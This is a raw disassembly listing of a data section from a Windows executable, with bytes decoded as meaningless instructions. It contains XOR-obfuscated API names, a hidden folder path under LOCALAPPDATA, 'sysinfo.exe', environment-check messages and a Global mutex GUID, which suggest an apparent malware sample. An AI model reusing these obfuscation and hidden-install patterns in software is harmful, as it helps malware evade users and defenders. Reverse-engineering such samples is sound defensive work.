   140004b69:	0a 00                	or     (%rax),%al
	...
   140004b7b:	ec                   	in     (%dx),%al
   140004b7c:	ce                   	(bad)
   140004b7d:	df f8                	(bad)
   140004b7f:	df cf                	(bad)
   140004b81:	e3 ca                	jrcxz  0x140004b4d
   140004b83:	c5 cf c7             	(bad)
   140004b86:	ce                   	(bad)
   140004b87:	fc                   	cld
   140004b88:	d9 c2                	fld    %st(2)
   140004b8a:	df ce                	(bad)
   140004b8c:	ed                   	in     (%dx),%eax
   140004b8d:	c2 c7 ce             	ret    $0xcec7
   140004b90:	e8 d9 ce ca df       	call   0x11fcb1a6e
   140004b95:	ce                   	(bad)
   140004b96:	ef                   	out    %eax,(%dx)
   140004b97:	c2 d9 ce             	ret    $0xced9
   140004b9a:	c8 df c4 d9          	enter  $0xc4df,$0xd9
   140004b9e:	d2 fc                	sar    %cl,%ah
   140004ba0:	e8 d9 ce ca df       	call   0x11fcb1a7e
   140004ba5:	ce                   	(bad)
   140004ba6:	ed                   	in     (%dx),%eax
   140004ba7:	c2 c7 ce             	ret    $0xcec7
   140004baa:	fc                   	cld
   140004bab:	e8 c7 c4 d8 ce       	call   0x10ed91077
   140004bb0:	e3 ca                	jrcxz  0x140004b7c
   140004bb2:	c5 cf c7             	(bad)
   140004bb5:	ce                   	(bad)
   140004bb6:	ec                   	in     (%dx),%al
   140004bb7:	ce                   	(bad)
   140004bb8:	df ee                	fucomip %st(6),%st
   140004bba:	c5 dd c2 d9 c4       	vcmppd $0xc4,%ymm1,%ymm4,%ymm3
   140004bbf:	c5 c6 ce             	(bad)
   140004bc2:	c5 df fd             	(bad)
   140004bc5:	ca d9 c2             	lret   $0xc2d9
   140004bc8:	ca c9 c7             	lret   $0xc7c9
   140004bcb:	ce                   	(bad)
   140004bcc:	fc                   	cld
   140004bcd:	e6 de                	out    %al,$0xde
   140004bcf:	c7                   	(bad)
   140004bd0:	df c2                	ffreep %st(2)
   140004bd2:	e9 d2 df ce ff       	jmp    0x13fcf2ba9
   140004bd7:	c4                   	(bad)
   140004bd8:	fc                   	cld
   140004bd9:	c2 cf ce             	ret    $0xcecf
   140004bdc:	e8 c3 ca d9 ec       	call   0x12cda16a4
   140004be1:	ce                   	(bad)
   140004be2:	df ff                	(bad)
   140004be4:	c2 c8 c0             	ret    $0xc0c8
   140004be7:	e8 c4 de c5 df       	call   0x11fc62ab0
   140004bec:	f8                   	clc
   140004bed:	c7                   	(bad)
   140004bee:	ce                   	(bad)
   140004bef:	ce                   	(bad)
   140004bf0:	db ec                	fucomi %st(4),%st
   140004bf2:	ce                   	(bad)
   140004bf3:	df e6                	(bad)
   140004bf5:	c4                   	(bad)
   140004bf6:	cf                   	iret
   140004bf7:	de c7                	faddp  %st,%st(7)
   140004bf9:	ce                   	(bad)
   140004bfa:	ed                   	in     (%dx),%eax
   140004bfb:	c2 c7 ce             	ret    $0xcec7
   140004bfe:	e5 ca                	in     $0xca,%eax
   140004c00:	c6                   	(bad)
   140004c01:	ce                   	(bad)
   140004c02:	fc                   	cld
   140004c03:	e8 c4 db d2 ed       	call   0x12dd327cc
   140004c08:	c2 c7 ce             	ret    $0xcec7
   140004c0b:	fc                   	cld
   140004c0c:	53                   	push   %rbx
   140004c0d:	65 74 46             	gs je  0x140004c56
   140004c10:	69 6c 65 49 6e 66 6f 	imul   $0x726f666e,0x49(%rbp,%riz,2),%ebp
   140004c17:	72 
   140004c18:	6d                   	insl   (%dx),(%rdi)
   140004c19:	61                   	(bad)
   140004c1a:	74 69                	je     0x140004c85
   140004c1c:	6f                   	outsl  (%rsi),(%dx)
   140004c1d:	6e                   	outsb  (%rsi),(%dx)
   140004c1e:	42 79 48             	rex.X jns 0x140004c69
   140004c21:	61                   	(bad)
   140004c22:	6e                   	outsb  (%rsi),(%dx)
   140004c23:	64 6c                	fs insb (%dx),(%rdi)
   140004c25:	65 00 6b 00          	add    %ch,%gs:0x0(%rbx)
   140004c29:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004c2d:	6e                   	outsb  (%rsi),(%dx)
   140004c2e:	00 65 00             	add    %ah,0x0(%rbp)
   140004c31:	6c                   	insb   (%dx),(%rdi)
   140004c32:	00 33                	add    %dh,(%rbx)
   140004c34:	00 32                	add    %dh,(%rdx)
   140004c36:	00 2e                	add    %ch,(%rsi)
   140004c38:	00 64 00 6c          	add    %ah,0x6c(%rax,%rax,1)
   140004c3c:	00 6c 00 00          	add    %ch,0x0(%rax,%rax,1)
   140004c40:	00 4c 00 4f          	add    %cl,0x4f(%rax,%rax,1)
   140004c44:	00 43 00             	add    %al,0x0(%rbx)
   140004c47:	41 00 4c 00 41       	add    %cl,0x41(%r8,%rax,1)
   140004c4c:	00 50 00             	add    %dl,0x0(%rax)
   140004c4f:	50                   	push   %rax
   140004c50:	00 44 00 41          	add    %al,0x41(%rax,%rax,1)
   140004c54:	00 54 00 41          	add    %dl,0x41(%rax,%rax,1)
   140004c58:	00 00                	add    %al,(%rax)
   140004c5a:	00 5c 00 4d          	add    %bl,0x4d(%rax,%rax,1)
   140004c5e:	00 69 00             	add    %ch,0x0(%rcx)
   140004c61:	63 00                	movsxd (%rax),%eax
   140004c63:	72 00                	jb     0x140004c65
   140004c65:	6f                   	outsl  (%rsi),(%dx)
   140004c66:	00 73 00             	add    %dh,0x0(%rbx)
   140004c69:	6f                   	outsl  (%rsi),(%dx)
   140004c6a:	00 66 00             	add    %ah,0x0(%rsi)
   140004c6d:	74 00                	je     0x140004c6f
   140004c6f:	5c                   	pop    %rsp
   140004c70:	00 57 00             	add    %dl,0x0(%rdi)
   140004c73:	69 00 6e 00 64 00    	imul   $0x64006e,(%rax),%eax
   140004c79:	6f                   	outsl  (%rsi),(%dx)
   140004c7a:	00 77 00             	add    %dh,0x0(%rdi)
   140004c7d:	73 00                	jae    0x140004c7f
   140004c7f:	5c                   	pop    %rsp
   140004c80:	00 00                	add    %al,(%rax)
   140004c82:	00 73 00             	add    %dh,0x0(%rbx)
   140004c85:	6d                   	insl   (%dx),(%rdi)
   140004c86:	00 2d 00 6f 00 75    	add    %ch,0x75006f00(%rip)        # 0x1b500bb8c
   140004c8c:	00 74 00 5c          	add    %dh,0x5c(%rax,%rax,1)
   140004c90:	00 00                	add    %al,(%rax)
   140004c92:	00 5c 00 4d          	add    %bl,0x4d(%rax,%rax,1)
   140004c96:	00 69 00             	add    %ch,0x0(%rcx)
   140004c99:	63 00                	movsxd (%rax),%eax
   140004c9b:	72 00                	jb     0x140004c9d
   140004c9d:	6f                   	outsl  (%rsi),(%dx)
   140004c9e:	00 73 00             	add    %dh,0x0(%rbx)
   140004ca1:	6f                   	outsl  (%rsi),(%dx)
   140004ca2:	00 66 00             	add    %ah,0x0(%rsi)
   140004ca5:	74 00                	je     0x140004ca7
   140004ca7:	5c                   	pop    %rsp
   140004ca8:	00 57 00             	add    %dl,0x0(%rdi)
   140004cab:	69 00 6e 00 64 00    	imul   $0x64006e,(%rax),%eax
   140004cb1:	6f                   	outsl  (%rsi),(%dx)
   140004cb2:	00 77 00             	add    %dh,0x0(%rdi)
   140004cb5:	73 00                	jae    0x140004cb7
   140004cb7:	5c                   	pop    %rsp
   140004cb8:	00 36                	add    %dh,(%rsi)
   140004cba:	00 41 00             	add    %al,0x0(%rcx)
   140004cbd:	30 00                	xor    %al,(%rax)
   140004cbf:	31 00                	xor    %eax,(%rax)
   140004cc1:	33 00                	xor    (%rax),%eax
   140004cc3:	43 00 37             	rex.XB add %sil,(%r15)
   140004cc6:	00 30                	add    %dh,(%rax)
   140004cc8:	00 5c 00 00          	add    %bl,0x0(%rax,%rax,1)
	...
   140004e98:	00 00                	add    %al,(%rax)
   140004e9a:	00 30                	add    %dh,(%rax)
   140004e9c:	31 32                	xor    %esi,(%rdx)
   140004e9e:	33 34 35 36 37 38 39 	xor    0x39383736(,%rsi,1),%esi
   140004ea5:	41                   	rex.B
   140004ea6:	42                   	rex.X
   140004ea7:	43                   	rex.XB
   140004ea8:	44                   	rex.R
   140004ea9:	45                   	rex.RB
   140004eaa:	46 0d 0a 00 60 00    	rex.RX or $0x60000a,%eax
   140004eb0:	00 6e b5             	add    %ch,-0x4b(%rsi)
   140004eb3:	6a 00                	push   $0x0
   140004eb5:	00 30                	add    %dh,(%rax)
   140004eb7:	6b 00 34             	imul   $0x34,(%rax),%eax
   140004eba:	00 00                	add    %al,(%rax)
   140004ebc:	00 e8                	add    %ch,%al
   140004ebe:	d9 ce                	fxch   %st(6)
   140004ec0:	ca df ce             	lret   $0xcedf
   140004ec3:	fb                   	sti
   140004ec4:	d9 c4                	fld    %st(4)
   140004ec6:	c8 ce d8 d8          	enter  $0xd8ce,$0xd8
   140004eca:	fc                   	cld
   140004ecb:	fc                   	cld
   140004ecc:	ca c2 df             	lret   $0xdfc2
   140004ecf:	ed                   	in     (%dx),%eax
   140004ed0:	c4                   	(bad)
   140004ed1:	d9 f8                	fprem
   140004ed3:	c2 c5 cc             	ret    $0xccc5
   140004ed6:	c7                   	(bad)
   140004ed7:	ce                   	(bad)
   140004ed8:	e4 c9                	in     $0xc9,%al
   140004eda:	c1 ce c8             	ror    $0xc8,%esi
   140004edd:	df ec                	fucomip %st(4),%st
   140004edf:	ce                   	(bad)
   140004ee0:	df ee                	fucomip %st(6),%st
   140004ee2:	d3 c2                	rol    %cl,%edx
   140004ee4:	df e8                	fucomip %st(0),%st
   140004ee6:	c4                   	(bad)
   140004ee7:	cf                   	iret
   140004ee8:	ce                   	(bad)
   140004ee9:	fb                   	sti
   140004eea:	d9 c4                	fld    %st(4)
   140004eec:	c8 ce d8 d8          	enter  $0xd8ce,$0xd8
   140004ef0:	e4 db                	in     $0xdb,%al
   140004ef2:	ce                   	(bad)
   140004ef3:	c5 e6 de             	(bad)
   140004ef6:	df ce                	(bad)
   140004ef8:	d3 fc                	sar    %cl,%esp
   140004efa:	e8 d9 ce ca df       	call   0x11fcb1dd8
   140004eff:	ce                   	(bad)
   140004f00:	e6 de                	out    %al,$0xde
   140004f02:	df ce                	(bad)
   140004f04:	d3 fc                	sar    %cl,%esp
   140004f06:	4e                   	rex.WRX
   140004f07:	65 74 77             	gs je  0x140004f81
   140004f0a:	6f                   	outsl  (%rsi),(%dx)
   140004f0b:	72 6b                	jb     0x140004f78
   140004f0d:	20 61 64             	and    %ah,0x64(%rcx)
   140004f10:	61                   	(bad)
   140004f11:	70 74                	jo     0x140004f87
   140004f13:	65 72 20             	gs jb  0x140004f36
   140004f16:	64 65 74 65          	fs gs je 0x140004f7f
   140004f1a:	63 74 65 64          	movsxd 0x64(%rbp,%riz,2),%esi
   140004f1e:	0d 0a 00 52 65       	or     $0x6552000a,%eax
   140004f23:	71 75                	jno    0x140004f9a
   140004f25:	69 72 65 64 20 64 65 	imul   $0x65642064,0x65(%rdx),%esi
   140004f2c:	70 65                	jo     0x140004f93
   140004f2e:	6e                   	outsb  (%rsi),(%dx)
   140004f2f:	64 65 6e             	fs outsb %gs:(%rsi),(%dx)
   140004f32:	63 69 65             	movsxd 0x65(%rcx),%ebp
   140004f35:	73 20                	jae    0x140004f57
   140004f37:	61                   	(bad)
   140004f38:	72 65                	jb     0x140004f9f
   140004f3a:	20 70 72             	and    %dh,0x72(%rax)
   140004f3d:	65 73 65             	gs jae 0x140004fa5
   140004f40:	6e                   	outsb  (%rsi),(%dx)
   140004f41:	74 0d                	je     0x140004f50
   140004f43:	0a 00                	or     (%rax),%al
   140004f45:	5c                   	pop    %rsp
   140004f46:	2f                   	(bad)
   140004f47:	4c 2f                	rex.WR (bad)
   140004f49:	47 2f                	rex.RXB (bad)
   140004f4b:	5b                   	pop    %rbx
   140004f4c:	2f                   	(bad)
   140004f4d:	4e 2f                	rex.WRX (bad)
   140004f4f:	5c                   	pop    %rsp
   140004f50:	2f                   	(bad)
   140004f51:	44 2f                	rex.R (bad)
   140004f53:	5c                   	pop    %rsp
   140004f54:	2f                   	(bad)
   140004f55:	0f 2f 00             	comiss (%rax),%xmm0
   140004f58:	2f                   	(bad)
   140004f59:	4c 2f                	rex.WR (bad)
   140004f5b:	5d                   	pop    %rbp
   140004f5c:	2f                   	(bad)
   140004f5d:	4a 2f                	rex.WX (bad)
   140004f5f:	4e 2f                	rex.WRX (bad)
   140004f61:	5b                   	pop    %rbx
   140004f62:	2f                   	(bad)
   140004f63:	4a 2f                	rex.WX (bad)
   140004f65:	0f 2f 00             	comiss (%rax),%xmm0
   140004f68:	2f                   	(bad)
   140004f69:	5b                   	pop    %rbx
   140004f6a:	2f                   	(bad)
   140004f6b:	41 2f                	rex.B (bad)
   140004f6d:	0f 2f 0d 2f 2f 2f 0d 	comiss 0xd2f2f2f(%rip),%xmm1        # 0x14d2f7ea3
   140004f74:	2f                   	(bad)
   140004f75:	0f 2f 00             	comiss (%rax),%xmm0
   140004f78:	2f                   	(bad)
   140004f79:	5b                   	pop    %rbx
   140004f7a:	2f                   	(bad)
   140004f7b:	5d                   	pop    %rbp
   140004f7c:	2f                   	(bad)
   140004f7d:	0f 2f 0d 2f 73 2f 0d 	comiss 0xd2f732f(%rip),%xmm1        # 0x14d2fc2b3
   140004f84:	2f                   	(bad)
   140004f85:	2f                   	(bad)
   140004f86:	2f                   	(bad)
   140004f87:	73 2f                	jae    0x140004fb8
   140004f89:	0d 2f 0d 2f 0f       	or     $0xf2f0d2f,%eax
   140004f8e:	2f                   	(bad)
   140004f8f:	00 2f                	add    %ch,(%rdi)
   140004f91:	5c                   	pop    %rsp
   140004f92:	2f                   	(bad)
   140004f93:	4c 2f                	rex.WR (bad)
   140004f95:	0f 2f 62 2f          	comiss 0x2f(%rdx),%xmm4
   140004f99:	66 2f                	data16 (bad)
   140004f9b:	61                   	(bad)
   140004f9c:	2f                   	(bad)
   140004f9d:	7a 2f                	jp     0x140004fce
   140004f9f:	7b 2f                	jnp    0x140004fd0
   140004fa1:	6a 2f                	push   $0x2f
   140004fa3:	0f 2f 00             	comiss (%rax),%xmm0
   140004fa6:	2f                   	(bad)
   140004fa7:	42 2f                	rex.X (bad)
   140004fa9:	40 2f                	rex (bad)
   140004fab:	0f 2f 1e             	comiss (%rsi),%xmm3
   140004fae:	2f                   	(bad)
   140004faf:	0f 2f 00             	comiss (%rax),%xmm0
   140004fb2:	2f                   	(bad)
   140004fb3:	49 2f                	rex.WB (bad)
   140004fb5:	2f                   	(bad)
   140004fb6:	2f                   	(bad)
   140004fb7:	73 2f                	jae    0x140004fe8
   140004fb9:	0d 2f 0f 2f 2f       	or     $0x2f2f0f2f,%eax
   140004fbe:	2f                   	(bad)
   140004fbf:	0d 2f 0f 2f 00       	or     $0x2f0f2f,%eax
   140004fc4:	2f                   	(bad)
   140004fc5:	5c                   	pop    %rsp
   140004fc6:	2f                   	(bad)
   140004fc7:	4c 2f                	rex.WR (bad)
   140004fc9:	0f 2f 62 2f          	comiss 0x2f(%rdx),%xmm4
   140004fcd:	66 2f                	data16 (bad)
   140004fcf:	61                   	(bad)
   140004fd0:	2f                   	(bad)
   140004fd1:	7a 2f                	jp     0x140005002
   140004fd3:	7b 2f                	jnp    0x140005004
   140004fd5:	6a 2f                	push   $0x2f
   140004fd7:	0f 2f 00             	comiss (%rax),%xmm0
   140004fda:	2f                   	(bad)
   140004fdb:	42 2f                	rex.X (bad)
   140004fdd:	40 2f                	rex (bad)
   140004fdf:	0f 2f 1e             	comiss (%rsi),%xmm3
   140004fe2:	2f                   	(bad)
   140004fe3:	0f 2f 00             	comiss (%rax),%xmm0
   140004fe6:	2f                   	(bad)
   140004fe7:	49 2f                	rex.WB (bad)
   140004fe9:	2f                   	(bad)
   140004fea:	2f                   	(bad)
   140004feb:	47 00 6c 00 6f       	add    %r13b,0x6f(%r8,%r8,1)
   140004ff0:	00 62 00             	add    %ah,0x0(%rdx)
   140004ff3:	61                   	(bad)
   140004ff4:	00 6c 00 5c          	add    %ch,0x5c(%rax,%rax,1)
   140004ff8:	00 00                	add    %al,(%rax)
   140004ffa:	00 22                	add    %ah,(%rdx)
   140004ffc:	00 00                	add    %al,(%rax)
   140004ffe:	00 20                	add    %ah,(%rax)
   140005000:	00 00                	add    %al,(%rax)
   140005002:	00 73 00             	add    %dh,0x0(%rbx)
   140005005:	79 00                	jns    0x140005007
   140005007:	73 00                	jae    0x140005009
   140005009:	69 00 6e 00 66 00    	imul   $0x66006e,(%rax),%eax
   14000500f:	6f                   	outsl  (%rsi),(%dx)
   140005010:	00 2e                	add    %ch,(%rsi)
   140005012:	00 65 00             	add    %ah,0x0(%rbp)
   140005015:	78 00                	js     0x140005017
   140005017:	65 00 00             	add    %al,%gs:(%rax)
	...
   14000520a:	00 4d 00             	add    %cl,0x0(%rbp)
   14000520d:	61                   	(bad)
   14000520e:	00 73 00             	add    %dh,0x0(%rbx)
   140005211:	4c 00 6f 00          	rex.WR add %r13b,0x0(%rdi)
   140005215:	73 00                	jae    0x140005217
   140005217:	73 00                	jae    0x140005219
	...
   140005309:	00 00                	add    %al,(%rax)
   14000530b:	7b 00                	jnp    0x14000530d
   14000530d:	43 00 41 00          	rex.XB add %al,0x0(%r9)
   140005311:	44 00 44 00 45       	add    %r8b,0x45(%rax,%rax,1)
   140005316:	00 34 00             	add    %dh,(%rax,%rax,1)
   140005319:	37                   	(bad)
   14000531a:	00 38                	add    %bh,(%rax)
   14000531c:	00 2d 00 34 00 41    	add    %ch,0x41003400(%rip)        # 0x181008722
   140005322:	00 45 00             	add    %al,0x0(%rbp)
   140005325:	46 00 2d 00 44 00 34 	rex.RX add %r13b,0x34004400(%rip)        # 0x17400972c
   14000532c:	00 45 00             	add    %al,0x0(%rbp)
   14000532f:	30 00                	xor    %al,(%rax)
   140005331:	2d 00 33 00 45       	sub    $0x45003300,%eax
   140005336:	00 34 00             	add    %dh,(%rax,%rax,1)
   140005339:	39 00                	cmp    %eax,(%rax)
   14000533b:	2d 00 37 00 32       	sub    $0x32003700,%eax
   140005340:	00 41 00             	add    %al,0x0(%rcx)
   140005343:	35 00 46 00 45       	xor    $0x45004600,%eax
   140005348:	00 42 00             	add    %al,0x0(%rdx)
   14000534b:	44 00 39             	add    %r15b,(%rcx)
   14000534e:	00 30                	add    %dh,(%rax)
   140005350:	00 38                	add    %bh,(%rax)
   140005352:	00 43 00             	add    %al,0x0(%rbx)
   140005355:	7d 00                	jge    0x140005357
	...
